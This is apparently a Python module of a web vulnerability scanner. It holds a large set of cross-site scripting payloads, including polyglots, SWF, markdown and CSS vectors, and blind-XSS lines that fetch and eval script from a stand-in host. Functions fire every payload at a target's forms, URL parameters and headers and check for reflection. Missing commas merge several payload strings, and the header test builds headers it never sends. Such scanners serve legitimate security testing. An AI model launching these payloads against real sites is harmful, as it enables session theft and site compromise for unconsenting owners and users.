import html
import os
import time
from itertools import product
from typing import List, Tuple, Any

from tqdm import tqdm

dir_path = os.path.dirname(os.path.realpath(__file__))

PAYLOADS_FILE_NAME = "wordlist/XXS_99_payload.txt"
# PAYLOADS_FILE_NAME = "wordlist/XSS_13000_payloads.txt"
PAYLOADS_ABSOLUTE_PATH = os.path.join(dir_path, PAYLOADS_FILE_NAME)
# PAYLOADS = set(map(str.rstrip, open(PAYLOADS_ABSOLUTE_PATH).readlines()))

PREFIXES_WORDLIST_FILE = "wordlist/small_prefix.txt"
PREFIXES_ABSOLUTE_PATH = os.path.join(dir_path, PREFIXES_WORDLIST_FILE)
# PREFIXES = set(map(lambda x: f'"?{str(x).rstrip()}=', open(PREFIXES_ABSOLUTE_PATH).readlines()))

PAYLOADS = {
    # Regular XSS payloads
    "<sCript>alert('XSS PAYLOAD')</scriPt>",
    "<script>alert('XSS PAYLOAD');</script>",
    "<sscriptcript>alert('XSS PAYLOAD');</sscriptcript>",
    '"><script>alert("XSS PAYLOAD");</script>',
    '"onpointerover="alert(45)"',
    "</textarea><script>alert('XSS PAYLOAD');</script>",
    "';alert('XSS PAYLOAD');//",
    "';alert('XSS PAYLOAD')//",
    '/images/cat.jpg" onerror="alert(\'XSS\');',
    "/images/cat.jpg' onerror='alert(\"XSS\")'>",
    # "#jaVasCript:/*-/*`/*\`/*'/*"'/**/(/**/oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e',
    "<sVg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
    "<ScRipt class=dalfox>DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)</script>",
    "<iframe srcdoc=\"<input onauxclick=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
    "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>",
    "<audio controls ondurationchange=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>",
    "<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)></menu></div>",
    "<iFrAme/src=jaVascRipt:DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></iFramE>",
    "<xmp><p title=\"</xmp><svg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
    "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
    "<audio controls ondurationchange=v(DALFOX_ALERT_VALUE)><source src=1.mp3 type=audio/mpeg></audio>",
    "<div contextmenu=xss><p>1<menu type=context onshow=alert(DALFOX_ALERT_VALUE)></menu></div>",
    "<iFrAme/src=jaVascRipt:DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)></iFramE>",
    "<xmp><p title=\"</xmp><svg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>",
    "<sVg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>",
    "<ScRipt>DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)</script>",
    "<dalfox class=dalfox>",

    '<marquee onmouseover=alert(1)>',
    '<svg/onload=alert(1)>',
    "<scr<script>ipt>alert('XSS PAYLOAD form')</scri</script>pt>",
    '<marquee onstart=alert(1)>',
    '<svg/onload=confirm(1);>',
    '<input onmousemove=alert(1)>',
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    # XSS payloads using various tags
    '<html><script>alert(1)</script></html>',
    '<body onload=alert(1)>',
    '<iframe onbeforeload=alert(1)>',
    '<object onerror=alert(1)>',
    # Base64-encoded XSS payloads
    'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'PGEgaHJlZj0iaHR0cDovL3d3dy5tZWRpYS5zZSI+',
    'PCFET0NUWVBFIGh0bWwg',
    # Additional XSS payloads
    '<img src=x onerror=alert(1);>',
    '<a href=javascript:alert(1);>',
    '<body background=javascript:alert(1);>',
    '<input type=image src= onerror=alert(1);>',
    '<isindex action=javascript:alert(1);>',
    '<layer src=javascript:alert(1);>',
    '<xml id=xx><x:script><!ENTITY xxe "test"></x:script></xml>',
    "<img src='x' onerror='alert(1)'>",
    "<body onload='alert(1)'>",
    "<iframe src='javascript:alert(1)'>",
    "<svg onload='alert(1)'>",
    "<div style='width:100px;height:100px;background:url(javascript:alert(1))'>",

    # Basic payload
    "<script>alert('XSS')</script>",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "\"><script>alert('XSS')</script>",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    # Img payload
    "<img src=x onerror=alert('XSS');>",
    "<img src=x onerror=alert('XSS')//",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
    "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "\"><img src=x onerror=alert('XSS');>",
    "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
    # Svg payload
    "<svg onload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert(1)//",
    "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    "<svg id=alert(1) onload=eval(id)>",
    "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
    "\"><svg/onload=alert(/XSS/)",
    "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",
    # Div payload
    "<div onpointerover=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerdown=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerenter=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerleave=\"alert(45)\">MOVE HERE</div>",
    "<div onpointermove=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerout=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerup=\"alert(45)\">MOVE HERE</div>"

    # Дополнительные нагрузки
    "<body onload=alert(/XSS/.source)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<video/poster/onerror=alert(1)>",
    "<video><source onerror=\"javascript:alert(1)\">",
    "<video src=_ onloadstart=\"alert(1)\">",
    "<details/open/ontoggle=\"alert`1`\">",
    "<audio src onloadstart=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>",
    "<body ontouchstart=alert(1)>",  # Triggers when a finger touch the screen
    "<body ontouchend=alert(1)>",  # Triggers when a finger is removed from touch screen
    "<body ontouchmove=alert(1)>"

    # XSS using a remote JS
    "<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>",
    "<script src=14.rs>",

    # XSS in hidden input
    "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",

    # Based on a DOM XSS sink
    "#\"><img src=/ onerror=alert(2)>",
    "=<ScRipt class=dalfox>print(1)</script>",

    # XSS in JS Context
    "-(confirm)(document.domain)//",
    "; alert(1);//",

    # XSS in files
    "<name>\n <value><![CDATA[<script>confirm(document.domain)</script>]]></value>\n</name>",

    # XSS in XML
    "<html>\n<head></head>\n<body>\n<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>\n</body>\n</html>",

    # XSS in SVG
    "<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n <script type=\"text/javascript\">\n    alert(document.domain);\n </script>\n</svg>",

    # XSS in SVG (short)
    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
    "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",

    # XSS in Markdown
    "[a](javascript:prompt(document.cookie))",
    "[a](j a v a s c r i p t:prompt(document.cookie))",
    "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
    "[a](javascript:window.onerror=alert;throw%201)",

    # XSS in SWF flash application
    # "Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);",
    # "IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}",
    # "IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);",

    # XSS in SWF flash application
    "flashmediaelement.swf?jsinitfunctio%gn=alert`1`",
    "flashmediaelement.swf?jsinitfunctio%25gn=alert(1)",
    "ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000",
    "swfupload.swf?movieName=\"]);}catch(e){}if(!self.a)self.a=!alert(1);//",
    "swfupload.swf?buttonText=test<a href=\"javascript:confirm(1)\"><img src=\"https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg\"/></a>&.swf",
    "plupload.flash.swf?%#target%g=alert&uid%g=XSS&",
    "moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true",
    "video-js.swf?readyFunction=alert(1)",
    "player.swf?playerready=alert(document.cookie)",
    "player.swf?tracecall=alert(document.cookie)",
    "banner.swf?clickTAG=javascript:alert(1);//",
    "io.swf?yid=\"));}catch(e){alert(1);}//",
    "video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29",
    "bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4",
    "flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//",
    "phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//",

    # XSS in CSS
    """
    <!DOCTYPE html>
    <html>
    <head>
    <style>
    div {
        background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
        background-color: #cccccc;
    }
    </style>
    </head>
      <body>
        <div>lol</div>
      </body>
    </html>
    """,

    # XSS in PostMessage
    """
    <html>
    <body>
        <input type=button value="Click Me" id="btn">
    </body>
    <script>
    document.getElementById('btn').onclick = function(e){
        window.poc = window.open('http://www.redacted.com/#login');
        setTimeout(function(){
            window.poc.postMessage(
                {
                    "sender": "accounts",
                    "url": "javascript:confirm('XSS')",
                },
                '*'
            );
        }, 2000);
    }
    </script>
    </html>
    """,

    # Blind XSS
    "\"><script src=//yoursubdomain.xss.ht></script>",
    # "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursubdomain.xss.ht\';document.body.appendChild(a)')",
    "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//yoursubdomain.xss.ht\");a.send();</script>",
    "<script>$.getScript(\"//yoursubdomain.xss.ht\")</script>",

    # Polyglot XSS — 0xsobky
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
    # Polyglot XSS — Ashar Javed
    "\"><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"<img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>\"><img src=\"http: //i.imgur.com/P8mL8.jpg\"",

    # Polyglot XSS — Mathias Karlsson
    "\" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//",
    # Polyglot XSS — Rsnake
    "\';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>",

    # Polyglot XSS — Daniel Miessler
    "\';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    "\" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//",
    "'><marquee><img src=x onerror=confirm(1)></marquee>\"</plaintext\\></|><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"<script>alert(1)</script>\"<img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'><img src=\"http://i.imgur.com/P8mL8.jpg\">",
    # "javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*",
    # "javascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a",
    # "javascript://</title>\"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/",
    # "javascript://</title></style></textarea>--></script><a\"//' onclick=alert()//>*/alert()/*",
    # "javascript://'//\" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*",
    # "javascript://</title></textarea></style></script --><li '//\" '*/alert()/*', onclick=alert()//",
    # "javascript:alert()//--></script></textarea></style></title><a\"//' onclick=alert()//>*/alert()/*",
    "--></script></title></style>\"/</textarea><a' onclick=alert()//>*/alert()/*",
    "/</title/'/</style/</script/</textarea/--><p\" onclick=alert()//>*/alert()/*",
    # "javascript://--></title></style></textarea></script><svg \"//' onclick=alert()//",
    "/</title/'/</style/</script/--><p\" onclick=alert()//>*/alert()/*",

    # Polyglot XSS — from @filedescriptor’s Polyglot Challenge
    # by crlf
    # "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>",
    # by europa
    # "javascript:\"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>",
    # by EdOverflow
    # "javascript:\"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>",
    # by h1/ragnar
    # "javascript:`//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`",

}

PREFIXES = {"?name=",
            "?query=",
            "?id=",
            "?q=",
            "?r=",
            "?r=';",
            "?q=';",
            "?search=",
            "?search=';",
            "search?q=",
            "?search_text=",
            "?s=",
            "?s=';",
            "?test=",
            "?keywords=",
            "?view=",
            "?error=",
            "?auth=",
            "1?auth=",
            "999999999?auth=",
            }


def test_xss_in_form(self, form: str, url: str, level: list[str], req_per_minute: int) -> List[Tuple[bool, str]]:
    """
    Test for Cross-Site Scripting (XSS) vulnerabilities in a web form.

    This function submits various payloads that could potentially execute JavaScript in a user's browser
    if the input is not properly sanitized. After each submission, it checks the response for the payload or its HTML-escaped equivalent.
    If either is found in the response, the corresponding payload is added to the results.

    Args:
        form (str): The web form to test.
        url (str): The URL to submit the form to.

    Returns:
        List[Tuple[bool, str]]: A list of tuples. Each tuple contains a boolean indicating whether the payload was found in the response,
                                 and the payload that was used.
    """

    payloads_progress_bar = tqdm(PAYLOADS,
                                 bar_format="{l_bar}%s{bar}%s{r_bar}" % ('\033[96m Payloads testing --> ', ''))

    results = []
    for payload in payloads_progress_bar:
        response = self.submit_form(form=form, value=payload, url=url)
        self.request_count += 1

        # self.logger.info(f"\n {url}\n{response.url}\n{url + '?' + payload} 🧐")

        if not response.ok:
            self.logger.error(f"\n{url} = {response.status_code}, {payload}")
            continue

        if payload in response.text or html.escape(payload) in response.text:
            results.append((True, payload))

        if level == "easy" and any(result[0] for result in results):
            break

        if req_per_minute is not None:
            pause = 60.0 / req_per_minute
            time.sleep(pause)

    return results


def test_xss_in_header(self, url: str, req_per_minute: int) -> List[Tuple[bool, str]]:
    results = []

    if req_per_minute is not None:
        pause = 60.0 / req_per_minute
        time.sleep(pause)

    payload = '<script>alert("SXSS")</script>'
    headers = {'User-Agent': payload, 'X-XSS-Protection': '0', 'X-Content-Type-Options': 'nosniff',
               'X-Frame-Options': 'deny', 'X-Content-Security-Policy': "default-src 'self'"}

    response = self.session.post(url)
    self.request_count += 1

    if "User Agent" in response.text:
        results.append((response.text))

    return results


def test_xss_in_link(self, url: str, level: list[str], req_per_minute: int) -> list[tuple[bool, Any, Any]]:
    """
    Test for Cross-Site Scripting (XSS) vulnerabilities in links.

    This function appends various payloads to a URL and checks the response for the payload or its HTML-escaped equivalent.
    If either is found in the response, the corresponding payload is added to the results.

    Args:
        url (str): The URL to test.

    Returns:
        List[Tuple[bool, str]]: A list of tuples. Each tuple contains a boolean indicating whether the payload was found in the response,
                                 and the payload that was used.
    """

    results = []
    progress_bar = tqdm(product(PREFIXES, PAYLOADS), total=len(PREFIXES) * len(PAYLOADS),
                        bar_format="{l_bar}%s{bar}%s{r_bar}" % (
                            f'\033[96m PREFIXES({len(PREFIXES)}): * PAYLOADS({len(PAYLOADS)}): ', ''))

    for prefix, payload in progress_bar:
        response = self.session.get(url=f"{url}{prefix}{payload}")
        self.request_count += 1

        if not response.ok:
            # self.logger.warning(f"\n{url} = {response.status_code}, {url}{prefix}{payload}")
            continue

        if payload in response.text or html.escape(payload) in response.text:
            results.append((True, prefix, payload))

        if level == "easy" and any(result[0] for result in results):
            break

        if req_per_minute is not None:
            pause = 60.0 / req_per_minute
            time.sleep(pause)

    return results


def test_xss_in_link_prefix(self, url: str, level: list[str], req_per_minute: int) -> list[tuple[bool, Any]]:
    """
    Test for Cross-Site Scripting (XSS) vulnerabilities in links.

    This function appends various payloads to a URL and checks the response for the payload or its HTML-escaped equivalent.
    If either is found in the response, the corresponding payload is added to the results.

    Args:
        url (str): The URL to test.

    Returns:
        List[Tuple[bool, str]]: A list of tuples. Each tuple contains a boolean indicating whether the payload was found in the response,
                                 and the payload that was used.
    """

    results = []
    progress_bar = tqdm(PAYLOADS,
                        bar_format="{l_bar}%s{bar}%s{r_bar}" % (f'\033[96m PAYLOADS({len(PAYLOADS)}): ', ''))

    for payload in progress_bar:
        response = self.session.get(url=f"{url}{payload}")
        # print(f"{url}{payload}")
        self.request_count += 1

        # if not response.ok:
        #     # self.logger.warning(f"\n{url} = {response.status_code}, {url}{prefix}{payload}")
        #     continue

        if payload in response.text or html.escape(payload) in response.text:
            # print(f"{url}{payload}")
            results.append((True, payload))

        if level == "easy" and any(result[0] for result in results):
            break

        if req_per_minute is not None:
            pause = 60.0 / req_per_minute
            time.sleep(pause)

    return results
